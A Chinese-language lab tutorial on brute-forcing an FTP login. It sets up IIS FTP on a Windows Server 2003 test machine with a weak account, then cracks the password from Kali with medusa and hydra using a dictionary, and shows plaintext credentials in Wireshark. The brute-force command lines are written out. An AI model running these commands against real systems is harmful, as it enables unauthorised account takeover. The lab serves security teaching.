#### 实验环境：

攻击机：Kali Linux       ip:192.168.133.134

目标机：Windows Server 2003 Enterprise       ip:192.168.133.145

#### 实验环境搭建：

**step1:**在windows server 2003 Enterprise 中安装FTP,"开始"--"控制面版"--“添加删除程序”--“添加/删除Windows组件”--“应用程序服务器”--“Internet信息服务（IIS）”--"文件传输协议（FTP）服务"--“确定”-----“下一步”等一路安装FTP（中途可能会遇到安装镜像文件，提前准备好安装Server2003安装光盘或百度搜索IIS6.0下载）。

![](../Images/868830038ac062a9ac8be98174832f2b.png)

设置光盘：  

![](../Images/6bab6b682d52f71eec1f88e0cfe535aa.png)

![](../Images/7f327e8168ed4c8c68e5c405251eb63f.png)

**setp2：**安装完成后进行配置，取消匿名登录：“我的电脑”--“右键-管理“--”Internet信息服务（IIS）管理器“--”FTP站点-默认站点“--”右键-属性“--”安全账户面板“--取消”允许匿名登录“：

![](../Images/820755cb8da10c9ebd5989274b081ca9.png)

**setp3:**为FTP添加账户：“我的电脑右键”--“管理”--“本地用户和组”--“右键新建用户”，用户名user，密码123456  

![](../Images/7a2ef1f87d71d83abf25eac3acd4dc2d.png)

**step4:**此时FTP 拥有了一个测试账户，环境搭建完毕。  

  

#### 攻击过程：

提前准备好一个密码字典，为了测试，里边需包含正确密码123456：

![](../Images/276eef93980813bb67e9b3ff2133a771.png)

**工具1：medusa**  

**step1**:kali 中打开终端,输入:medusa -h 192.168.133.145 -u 用户名 -P  密码字典  -M ftp

//-M为要攻击的模式  ，medusa -d    //查看攻击模块列表   //-U  用户名字典    -u  用户名

![](../Images/fbd5e0e74b0ac295895b93ff5cbbcda5.png)

暴力破解密码成功，同时可以使用wireshark尝试抓取用户名、密码：  

![](../Images/17b941468226df6b3d34914b64371cb0.png)

证明密码是明文传送的。  

**medusa参数列表：**

![](../Images/21de9af6b805c1ba2d4356265cfaf723.png)

**工具2：hydra**

**step1:** kali终端中输入：hydra  -l  用户名  -P  字典  ftp://192..168.133.145

![](../Images/9b32ca30355fb79768da8183f00751ae.png)

破解密码成功。
